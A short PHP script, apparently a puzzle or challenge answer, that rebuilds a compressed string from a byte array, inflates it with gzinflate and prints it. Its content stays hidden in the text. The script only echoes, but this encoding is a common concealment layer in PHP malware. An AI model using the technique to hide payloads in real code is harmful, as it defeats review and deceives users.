<?
        $code='';
        $data=Array(141,144,65,79,194,64,16,133,239,252,138,97,211,132,221,3,197,179,180,53,198,112,22,69,79,42,77,237,14,233,70,178,219,204,110,165,132,244,191,91,74,5,74,141,58,167,201,204,123,147,111,30,192,161,60,151,41,59,142,202,178,156,39,214,110,100,232,197,243,251,197,211,11,59,78,216,219,116,0,61,245,194,20,148,98,106,36,214,142,199,217,195,243,172,53,157,22,231,70,181,226,63,121,5,216,204,108,98,219,12,56,83,90,98,233,231,89,206,196,159,214,48,100,87,76,64,78,74,59,96,129,84,159,209,45,33,108,77,1,132,137,220,194,202,16,236,125,55,176,140,151,193,100,47,8,222,41,122,213,172,115,219,58,90,163,230,151,57,8,177,59,170,122,20,109,84,33,211,198,213,240,113,150,144,100,23,134,125,125,195,217,148,84,238,162,100,141,228,248,232,206,16,97,234,224,90,12,71,34,152,180,203,14,215,49,111,10,189,164,112,217,56,162,68,127,112,86,71,131,186,201,86,244,197,23,184,67,143,4,236,14,8,237,17,36,50,100,185,152,74,133,211,234,92,223,57,86,225,218,226,127,191,105,178,48,36,65,213,96,205,99,190,239,255,246,87,53,56,117,95);
        for($i=0;$i<count($data);$i++){
            $code.=chr($data[$i]);
        }
        $solution = (gzinflate($code));
		echo $solution;
?>